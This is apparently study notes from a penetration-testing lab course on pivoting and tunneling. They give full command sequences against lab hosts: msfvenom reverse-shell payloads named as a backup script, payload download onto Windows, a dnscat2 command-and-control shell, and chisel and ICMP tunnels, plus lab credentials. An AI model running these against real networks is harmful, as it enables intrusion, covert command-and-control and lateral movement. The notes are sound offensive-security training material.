# PIVOTING, TUNNELING, AND PORT FORWARDING

![PivotingandTunnelingVisualized.gif](.gitbook/assets/PivotingandTunnelingVisualized.gif)

# Introduction

Pivoting is essentially the idea of `moving to other networks through a compromised host to find more targets on different network segments`.
General terms used to describe compromised host

- `Pivot Host`
- `Proxy`
- `Foothold`
- `Beach Head system`
- `Jump Host`

 `Tunneling`, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it.

# **Lateral Movement, Pivoting, and Tunneling Compared**

### **Lateral Movement**

- Lateral movement can be described as a technique used to further our access to additional `hosts`, `applications`, and `services` within a network environment.
`practical example would be`
    
    During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further.
    

### **Pivoting**

- Pivoting refers to the technique used by attackers to move deeper into a network after gaining initial access. It typically involves the use of a compromised system as a launchpad to access other parts of the network that are not directly reachable from the attacker’s position
`Practical example`
During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment.

### **Tunneling**

- The key here is obfuscation of our actions to avoid detection for as long as possible.
    
    `practical example`
    
    One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.
    

# **Choosing The Dig Site & Starting Our Tunnels**

## **Dynamic Port Forwarding with SSH and SOCKS Tunneling**

### `Port forwarding` is a technique that allows us to redirect a communication request from one port to another.

**SSH Local Port Forwarding**

Scanning the target using nmap gives

```
dollarboysushil@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

we can see ssh is open but mysql is closed. To access mysql we can either ssh into the server and access mysql from there.

or we can port forward it to our localhost on port 1234 

### **Executing the Local Port Forward**

```
dollarboysushil@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
ubuntu@10.129.202.64's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```

`-L` is used to specify SSH client to request the ssh server to forward all data we send via port `1234` to `localhost:3306`

By doing this, we should be able to access the MySQL service locally on port 1234. 
In simple word, we will get the content of [`localhost:3306`](http://localhost:3306) from windows on our port `1234` , if we goto `localhost:3306` on kali, we can access windows resources on `localhost:3306`

### **Confirming Port Forward with Netstat**

```
dollarboysushil@htb[/htb]$ netstat -antp | grep 1234(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
```

### **Confirming Port Forward with Nmap**

```
dollarboysushil@htb[/htb]$ nmap -v -sV -p1234 localhost

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

### **Forwarding Multiple Ports**

```bash
dollarboysushil@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

# **Setting up to Pivot**

```
ubuntu@WEB01:~$ ifconfig 
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

unlike previous scenario, this time we don't know which services lie on the other side of the network . so , we can scan smaller ranges of IPs `172.16.5.1-200`  or the entire subnet `172.16.5.0/23`. Also we cannot scan directly from out attack host as it doesnot have routes to the `172.16.5.0/23` network.

To solve this, we will perform `dynamic port forwarding` and `pivot` our network packets via the Ubuntu server.

First we will start `SOCKS listener` on our machine, then configure ssh to forward that traffic via ssh to the network `172.16.5.0/23` after connecting to our local host.

This is called `SSH tunneling` over `SOCKS proxy`

### **Enabling Dynamic Port Forwarding with SSH**

```bash
dollarboysushil@htb[/htb]**$** ssh -D 9050 ubuntu@10.129.202.64
```

The `-D` argument requests the SSH server to enable dynamic port forwarding. Once done, we will use tool to route any tools packets over the port 9050 i.e `proxychains` which is capable of redirecting tcp connections through TOR SOCKS and HTTP/s proxy servers and allows us to chain multiple proxy servers together.

we must edit  `/etc/proxychains.conf` file to inform proxychains that we must use port 9050.

add this into conf file`socks4 127.0.0.1 9050`

### **Using Nmap with Proxychains**

```
	dollarboysushil@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
	ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
```

This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called `SOCKS tunneling`

we can only perform full tcp scan over proxychains because

```
dollarboysushil@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
```

# **Using Metasploit with Proxychains**

```
dollarboysushil@htb[/htb]$ proxychains msfconsoleProxyChains-3.1 (http://proxychains.sf.net)

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`

                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
```

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.

### **Using xfreerdp with Proxychains**

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## **Remote/Reverse Port Forwarding with SSH**

![Untitled](.gitbook/assets/Untitled%201.png)

- First we will create rev shell using metasploit, we will set the LHOST to that of pivot machine i.e `Ubuntu`.
- Then we will use port `8080` on ubuntu server to forward all of our reverse packets to our attacker host’s `8000` port

- `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080` → creating revshell
- `use exploit/multi/handler` → configuring and starting the multi/handler here lport will be `8000`

### **Transferring Payload to Pivot Host then send it to target (Windows A)**

- `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`   →transfer this payload to pivot host
- `python3 -m http.server 8123` → create http server on pivot machine to transfer this payload

- `PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` → on windows download the payload from pivot machine

Once revshell is transferred to windows, we will use `SSH remote port forwarding` to forward connections from ubuntu servers port 8080 to msfconsole’s port 8000

```bash
dollarboysushil@htb[/htb]**$** ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

`-vN`  → to make verbose and not to prompt login shell

`-R`  → asks ubuntu server to listen`<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

## **Meterpreter Tunneling & Port Forwarding**

If we have `meterpreter shell` access on Ubuntu server (pivot server), and we want to perform enumeration scans through the pivot host.
We can create a pivot with our meterpreter session without relying on ssh port forwarding.

- `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080` → creating payload for ubuntu pivot host
- `use exploit/multi/handler` → setting up multi/handler (setting lhost=0.0.0.0)
    
    then transfer this payload to ubuntu pivot host
    
- `./backupjob` → execute payload in pivot host

### **Ping Sweep**

We know that the Windows target is on the `172.16.5.0/23` network. Assuming windows target allows icmp request, we can use `ping_sweep` module in metsploit.

- `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`

### **Ping Sweep For Loop on Linux Pivot Hosts**

- `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`

### **Ping Sweep For Loop Using CMD**

- `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`

### **Ping Sweep Using PowerShell**

- `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`

<aside>
💡 Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

</aside>

### **Configuring MSF's SOCKS Proxy**

There could be a scenarios when a host firewall blocks ping (ICMP). In this case we can perform tcp scan. Instead of using ssh for port forwarding, we can also use Metasploit's post exploitation routing module `socks_proxy` to configure a local proxy on our attack host.

We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.

- `use auxiliary/server/socks_proxy`
- `set SRVPORT 9050`
- `set SRVHOST 0.0.0.0`
- `set version 4a`
- `run`

### **Confirming Proxy Server is Running**

```
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our `proxychains.conf` file located at `/etc/proxychains.conf` if it isn't already there.

### **Adding a Line to proxychains.conf if Needed**

```
socks4 	127.0.0.1 9050
```

<aside>
💡 Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

</aside>

Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.

```
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

### **Testing Proxy & Routing Functionality**

```
dollarboysushil@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -PnProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

# **Port Forwarding**

This can be achieved using `portfwd` module. We can enable a listener on our attack host and request meterpreter to forward all the packets received on this port via our meterpreter session to a remote host on the `172.16.5.0/23` network.

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.

Then we can create remote desktop session using xfreerdp `localhost:300`

`xfreerdp /v:localhost:3300 /u:victor /p:pass@123`

# **Meterpreter Reverse Port Forwarding (remote port forwarding)**

 We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`. We will also configure our listener to listen on port 8081 for a Windows shell.

### **Reverse Port Forwarding Rules**

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

### **Configuring & Starting multi/handler**

```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

```
dollarboysushil@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

```
[*] Started reverse TCP handler on 0.0.0.0:8081
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

# Playing Pong with Socat

## **Socat Redirection with a Reverse Shell**

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling
 It acts as a redirector that can listen on one host and port and forward that data to another IP address and port

### **Starting Socat Listener on Ubuntu (pivot machine)**

- `ubuntu@Webserver:~**$** socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`
socat will listen on port 8080 and forward all the traffic to port 80 on our attack host `10.10.14.18`

lets create a payload that will connect to pivot machine.

- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129{pivot machine ip} -f exe -o backupscript.exe LPORT=8080`

lets create listener on our attack host so that as soon as socat receives a connection from a target it will redirect all the traffic to our attack host’s listener.

- `sudo msfconsole`

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

## **Socat Redirection with a Bind Shell**

![Untitled](Untitled%201%201.png)

In the case of bind shells, the Windows server will start a listener and bind to a particular port. 

### **Creating the Windows Payload**

- `msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443`

### **Starting Socat Bind Shell Listener**

- `socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`

We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.

### **Configuring & Starting the Bind multi/handler**

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

# **Pivoting Around Obstacles**

# **SSH for Windows: plink.exe**

`plink` is short for PuTTY link, which is windows cli ssh tool which comes with Putty package when installed.

Before Fall of 2018, windows did not have a native ssh client included, so putty was popular choice for sysadmins.

Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies

## **Getting To Know Plink**

![Untitled](.gitbook/assets/Untitled%202.png)

For this, Windows is used as attack host.

Windows attack host starts, plink.exe process to start dynamic port forward over the ubuntu server

- `plink -ssh -D 9050 ubuntu@10.129.15.50`

This starts ssh session between the windows attack host and ubuntu server, and then plink starts listening on port 9050

Then windows tool `Proxifier` can be used to start a SOCKS tunnel via ssh session we created.

after configuring SOCKS server for `127.0.0.1` and port `9050` we can directly start `mstc.exe` to start RDP session with  victim windows target.

## **SSH Pivoting with Sshuttle**

[Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python, configuring proxychains is not necessary with this tool

- `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v`  -r option to connect to remote machine with a username and password.
    
    Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
    
- `nmap -v -sV -p3389 172.16.5.19 -A -Pn` → we dont need to use proxychains, as sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

## **Web Server Pivoting with Rpivot**

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling.

![Untitled](.gitbook/assets/Untitled%203.png)

- `sudo git clone https://github.com/klsecservices/rpivot.git`
- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:

```bash
dollarboysushil@htb[/htb]**$** scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

- `python2.7 [client.py](http://client.py) --server-ip 10.10.14.18 --server-port 9999` running client.py form pivot machine

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

- `proxychains firefox-esr 172.16.5.135:80` browsing to the target webserver using proxychains

# **Port Forwarding with Windows Netsh**

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. 

![Untitled](Untitled%204.png)

We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

```bash
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

here, listenport and listenaddress are similar to lhost and lport (pivot host) and connectport and connectaddress are similar to Rhost and rport (for victim windows server)

### **Verifying Port Forward**

```
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```

After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.

![Untitled](Untitled%205.png)

in xfreerdp we are specifying pivot machine ip and port at which pivot machine is listening.

# **Branching Out Our Tunnels**

## **DNS Tunneling with Dnscat2**

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts.
It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol 

- `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` → starting dnscat2 server
    
    ip is of kali linux
    
    This will generate secret key which we will have to provide to our dnscat2 client on the windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.
    
    ### **Cloning dnscat2-powershell to the Attack Host**
    
    - `git clone https://github.com/lukebaggett/dnscat2-powershell.git`
    
    Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.
    
    ### **Importing dnscat2.ps1**
    
    - `PS C:\htb> Import-Module .\dnscat2.ps1`

Then lets establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

```

Start-Dnscat2 -DNSserver 10.10.14.7 -Domain inlanefreight.local -PreSharedSecret e11c67b58a77f306eae39e33a5de2384 -Exec cmd

### **Interacting with the Established Session**

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

## **SOCKS5 Tunneling with Chisel**

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. 

Chisel can create a client-server tunnel connection in a firewall restricted environment. 

Let us consider a scenario where we have to tunnel our traffic to a webserver on the `172.16.5.0`/`23` network (internal network). We have the Domain Controller with the address `172.16.5.19`. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

### **Building the Chisel Binary**

```
dollarboysushil@htb[/htb]$ cd chisel
													 go build
```

### **Transferring Chisel Binary to Pivot Host**

```
dollarboysushil@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
ubuntu@10.129.202.64's password:
chisel                                        100%   11MB   1.2MB/s   00:09
```

### **Running the Chisel Server on the Pivot Host**

```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

### **Connecting to the Chisel Server**

```
dollarboysushil@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connecte
```

We can see chisel has created TCP/UDP unnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080

Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

- `socks5 127.0.0.1 1080` → in proxychains conf file

### **Pivoting to the DC**

- `dollarboysushil@htb[/htb]**$** proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`

## **Chisel Reverse Pivot**

In previous option we set pivot host (ubuntu) as out chisel server, listening on port 1234. What if there is firewall rules restrict inbound connections to our compromised target.

In such case we will use this reverse option.

```
dollarboysushil@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

when server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed.

 The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

### **Connecting the Chisel Client to our Attack Host**

```
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

### **Editing & Confirming proxychains.conf**

```
dollarboysushil@htb[/htb]$ tail -f /etc/proxychains.conf 
[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```

```bash
dollarboysushil@htb[/htb]**$** proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

`If we get error we can try different server`

## **ICMP Tunneling with SOCKS**

ICMP tunneling encapsulates your traffic within `ICMP packets` containing `echo requests` and `responses`. 

This method will only work if ping response are permitted within a firewalled network.

We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host. Let's start by setting up ptunnel-ng.

### **Building Ptunnel-ng with Autogen.sh**

Once the ptunnel-ng repo is cloned to our attack host, we can run the `autogen.sh` script located at the root of the ptunnel-ng directory.

```bash
dollarboysushil@htb[/htb]**$** sudo ./autogen.sh
```

- `dollarboysushil@htb[/htb]**$** scp -r ptunnel-ng ubuntu@10.129.202.64:~/` → to transfer ptunnel-ng to the pivot host.

### **Starting the ptunnel-ng Server on the Target Host**

```
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
[sudo] password for ubuntu:
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

`-r` flag is used to specify ip we want ptunnel-ng to connect on.  In this case, whatever IP is reachable from our attack host would be what we would use.

### **Connecting to ptunnel-ng Server from Attack Host**

```
dollarboysushil@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

`p-`  is used to specify ip of target

